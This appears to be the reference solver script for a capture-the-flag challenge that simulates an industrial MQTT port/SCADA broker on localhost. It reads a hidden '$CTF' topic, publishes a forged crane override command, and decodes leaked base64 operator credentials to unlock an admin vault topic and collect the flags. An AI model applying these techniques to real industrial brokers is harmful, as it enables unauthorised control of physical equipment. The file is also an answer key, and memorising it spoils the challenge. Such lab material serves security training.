#!/usr/bin/env python3
"""Agadir MedPort MQTT SCADA — reference solver.

F1 (medium): subscribe to `$CTF/#`. The MQTT spec says the `#` wildcard
             does NOT match topics starting with `$`, so a naive
             `mosquitto_sub -t '#'` misses the hidden diagnostic topic.

F2 (medium): publish a crafted override JSON to `agadir/quay/crane1/cmd`
             and read the `audit_token` from the simulator's reply.

F3 (hard):   read the retained `agadir/ops/briefing` (base64), decode
             to obtain opsadmin credentials, open an authenticated
             connection, publish `unlock` on `agadir/admin/vault`, and
             capture the vault response.
"""
from __future__ import annotations

import base64
import json
import re
import sys
import threading
import time

import paho.mqtt.client as mqtt

HOST = "localhost"
PORT = 1884
FLAG_RE = re.compile(r"INFODAYS\{[^}]+\}")

flags = {"f1": None, "f2": None, "f3": None}
ops_creds = {"user": None, "pass": None}
briefing_seen = threading.Event()


def _new_client(cid: str):
    try:
        return mqtt.Client(
            client_id=cid,
            callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
            clean_session=True,
        )
    except AttributeError:
        return mqtt.Client(client_id=cid, clean_session=True)


def on_connect_anon(client, _u, _f, rc, _p=None):
    print(f"[+] anon connected rc={rc}")
    client.subscribe("$CTF/#", qos=1)
    client.subscribe("agadir/#", qos=1)


def on_message_anon(_client, _u, msg):
    topic = msg.topic
    payload = msg.payload.decode(errors="replace")

    if topic.startswith("$CTF/") and not flags["f1"]:
        m = FLAG_RE.search(payload)
        if m:
            flags["f1"] = m.group(0)
            print(f"[+] F1 = {flags['f1']}")

    if topic == "agadir/quay/crane1/status" and "audit_token" in payload:
        m = FLAG_RE.search(payload)
        if m and not flags["f2"]:
            flags["f2"] = m.group(0)
            print(f"[+] F2 = {flags['f2']}")

    if topic == "agadir/ops/briefing" and not briefing_seen.is_set():
        try:
            dec = base64.b64decode(payload).decode()
        except Exception as exc:
            print(f"[!] briefing decode failed: {exc}")
            return
        u_m = re.search(r"Ops user:\s*(\S+)", dec)
        p_m = re.search(r"Ops pass:\s*(\S+)", dec)
        if u_m and p_m:
            ops_creds["user"] = u_m.group(1)
            ops_creds["pass"] = p_m.group(1)
            print(f"[+] ops creds = {ops_creds['user']}:{ops_creds['pass']}")
            briefing_seen.set()


def on_connect_admin(client, _u, _f, rc, _p=None):
    print(f"[+] admin connected rc={rc}")
    client.subscribe("agadir/admin/vault/response", qos=1)


def on_message_admin(_client, _u, msg):
    if msg.topic == "agadir/admin/vault/response":
        m = FLAG_RE.search(msg.payload.decode(errors="replace"))
        if m and not flags["f3"]:
            flags["f3"] = m.group(0)
            print(f"[+] F3 = {flags['f3']}")


def wait_for(cond, timeout=10.0, step=0.25):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if cond():
            return True
        time.sleep(step)
    return False


def main() -> int:
    anon = _new_client("solver_anon")
    anon.on_connect = on_connect_anon
    anon.on_message = on_message_anon
    anon.connect(HOST, PORT, 60)
    anon.loop_start()

    if not wait_for(lambda: flags["f1"] and briefing_seen.is_set(), timeout=15):
        print("[!] timed out waiting for F1 / briefing")

    anon.publish(
        "agadir/quay/crane1/cmd",
        json.dumps({"force": "override", "mode": "diagnostic", "op": "solver"}),
        qos=1,
    )
    wait_for(lambda: flags["f2"] is not None, timeout=10)

    if not (ops_creds["user"] and ops_creds["pass"]):
        print("[!] no ops creds — aborting F3")
    else:
        admin = _new_client("solver_admin")
        admin.username_pw_set(ops_creds["user"], ops_creds["pass"])
        admin.on_connect = on_connect_admin
        admin.on_message = on_message_admin
        admin.connect(HOST, PORT, 60)
        admin.loop_start()
        time.sleep(0.5)
        admin.publish("agadir/admin/vault", "unlock", qos=1)
        wait_for(lambda: flags["f3"] is not None, timeout=10)
        admin.loop_stop()

    anon.loop_stop()
    print("---")
    for k, v in flags.items():
        print(f"{k}: {v}")
    return 0 if all(flags.values()) else 1


if __name__ == "__main__":
    sys.exit(main())
